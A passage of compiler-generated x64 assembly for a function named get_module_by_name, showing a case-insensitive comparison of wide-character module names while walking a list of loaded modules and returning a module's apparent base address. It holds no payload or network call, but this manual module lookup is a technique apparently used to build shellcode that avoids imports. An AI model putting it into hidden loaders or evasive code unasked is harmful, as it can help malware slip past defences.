	mov	rcx, QWORD PTR i$1[rsp]
	movzx	eax, WORD PTR [rax+rcx*2]
	cmp	eax, 90					; 0000005aH
	jg	SHORT $LN11@get_module
	mov	rax, QWORD PTR module_name$[rsp]
	mov	rcx, QWORD PTR i$1[rsp]
	movzx	eax, WORD PTR [rax+rcx*2]
	cmp	eax, 65					; 00000041H
	jl	SHORT $LN11@get_module
	mov	rax, QWORD PTR module_name$[rsp]
	mov	rcx, QWORD PTR i$1[rsp]
	movzx	eax, WORD PTR [rax+rcx*2]
	sub	eax, 65					; 00000041H
	add	eax, 97					; 00000061H
	mov	DWORD PTR tv132[rsp], eax
	mov	rax, QWORD PTR module_name$[rsp]
	mov	rcx, QWORD PTR i$1[rsp]
	movzx	edx, WORD PTR tv132[rsp]
	mov	WORD PTR [rax+rcx*2], dx
	movzx	eax, WORD PTR tv132[rsp]
	mov	WORD PTR tv136[rsp], ax
	jmp	SHORT $LN12@get_module
$LN11@get_module:
	mov	rax, QWORD PTR module_name$[rsp]
	mov	rcx, QWORD PTR i$1[rsp]
	movzx	eax, WORD PTR [rax+rcx*2]
	mov	WORD PTR tv136[rsp], ax
$LN12@get_module:
	movzx	eax, WORD PTR tv136[rsp]
	mov	WORD PTR c1$2[rsp], ax
; Line 90
	mov	rax, QWORD PTR curr_name$4[rsp]
	mov	rcx, QWORD PTR i$1[rsp]
	movzx	eax, WORD PTR [rax+rcx*2]
	cmp	eax, 90					; 0000005aH
	jg	SHORT $LN13@get_module
	mov	rax, QWORD PTR curr_name$4[rsp]
	mov	rcx, QWORD PTR i$1[rsp]
	movzx	eax, WORD PTR [rax+rcx*2]
	cmp	eax, 65					; 00000041H
	jl	SHORT $LN13@get_module
	mov	rax, QWORD PTR curr_name$4[rsp]
	mov	rcx, QWORD PTR i$1[rsp]
	movzx	eax, WORD PTR [rax+rcx*2]
	sub	eax, 65					; 00000041H
	add	eax, 97					; 00000061H
	mov	DWORD PTR tv151[rsp], eax
	mov	rax, QWORD PTR curr_name$4[rsp]
	mov	rcx, QWORD PTR i$1[rsp]
	movzx	edx, WORD PTR tv151[rsp]
	mov	WORD PTR [rax+rcx*2], dx
	movzx	eax, WORD PTR tv151[rsp]
	mov	WORD PTR tv155[rsp], ax
	jmp	SHORT $LN14@get_module
$LN13@get_module:
	mov	rax, QWORD PTR curr_name$4[rsp]
	mov	rcx, QWORD PTR i$1[rsp]
	movzx	eax, WORD PTR [rax+rcx*2]
	mov	WORD PTR tv155[rsp], ax
$LN14@get_module:
	movzx	eax, WORD PTR tv155[rsp]
	mov	WORD PTR c2$3[rsp], ax
; Line 91
	movzx	eax, WORD PTR c1$2[rsp]
	movzx	ecx, WORD PTR c2$3[rsp]
	cmp	eax, ecx
	je	SHORT $LN8@get_module
	jmp	SHORT $LN5@get_module
$LN8@get_module:
; Line 92
	jmp	$LN4@get_module
$LN5@get_module:
; Line 93
	mov	rax, QWORD PTR module_name$[rsp]
	mov	rcx, QWORD PTR i$1[rsp]
	movzx	eax, WORD PTR [rax+rcx*2]
	test	eax, eax
	jne	SHORT $LN9@get_module
	mov	rax, QWORD PTR curr_name$4[rsp]
	mov	rcx, QWORD PTR i$1[rsp]
	movzx	eax, WORD PTR [rax+rcx*2]
	test	eax, eax
	jne	SHORT $LN9@get_module
; Line 95
	mov	rax, QWORD PTR curr_module$[rsp]
	mov	rax, QWORD PTR [rax+48]
	jmp	SHORT $LN1@get_module
$LN9@get_module:
; Line 98
	mov	rax, QWORD PTR curr_module$[rsp]
	mov	rax, QWORD PTR [rax]
	mov	QWORD PTR curr_module$[rsp], rax
; Line 99
	jmp	$LN15@get_module
$LN3@get_module:
; Line 100
	xor	eax, eax
$LN1@get_module:
; Line 101
	add	rsp, 104				; 00000068H
	pop	rdi
	pop	rsi
	ret	0
?get_module_by_name@@YAPEAXPEA_W@Z ENDP			; get_module_by_name
_TEXT	ENDS
END
